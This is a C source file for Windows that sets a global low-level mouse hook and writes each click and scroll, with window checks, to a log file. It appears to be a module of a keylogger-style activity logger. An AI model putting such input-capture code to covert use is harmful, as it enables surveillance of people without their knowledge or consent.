#include "mouse_hook.h"
#include "../libraries/window_functions.h"
#include "../libraries/fileio.h"

HHOOK MouseHook;

LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    int MScrollUp = 0;
    int MScrollDown = 0;

    compareWindows();

    MSLLHOOKSTRUCT * pMouseStruct = (MSLLHOOKSTRUCT *)lParam;

    char lbttndn[] = "\r\n[Left Mouse]\r\n";
    char rbttndn[] = "\r\n[Right Mouse]\r\n";
    char mbttndn[] = "\r\n[Middle mouse]\r\n";
    char wheelup[] = "\r\n[Mouse scrolled up.]\r\n";
    char wheeldn[] = "\r\n[Mouse scrolled down.]\r\n";

    switch ( wParam )
    {
    case WM_LBUTTONUP:
//				writeLine(lbttnup);
        break;
    case WM_LBUTTONDOWN:
        writeLine(lbttndn);
        break;
    case WM_LBUTTONDBLCLK:
//				writeLine(lbttndbl);
        break;
    case WM_RBUTTONUP:
//				writeLine(rbttnup);
        break;
    case WM_RBUTTONDOWN:
        writeLine(rbttndn);
        break;
    case WM_RBUTTONDBLCLK:
//				writeLine(rbttndbl);
        break;
    case WM_MBUTTONUP:
//				writeLine(mbttnup);
        break;
    case WM_MBUTTONDOWN:
        writeLine(mbttndn);
        break;
    case WM_MBUTTONDBLCLK:
//				writeLine(mbttndbl);
        break;
    case WM_MOUSEWHEEL:
        if(pMouseStruct != NULL)
        {
            int mouseData = HIWORD(pMouseStruct->mouseData);
            if(mouseData == 120) MScrollUp = 1;
            if(mouseData == 65416) MScrollDown = 1;
            if(MScrollDown == 1) writeLine(wheeldn);
            if(MScrollUp == 1) writeLine(wheelup);
        }
        break;
    }
    return CallNextHookEx(NULL,nCode,wParam,lParam);
}

void begMouseHook(HINSTANCE hInstance)
{
    MouseHook = SetWindowsHookEx(WH_MOUSE_LL,MouseHookProc,hInstance,0);
}

void endMouseHook()
{
    UnhookWindowsHookEx(MouseHook);
}
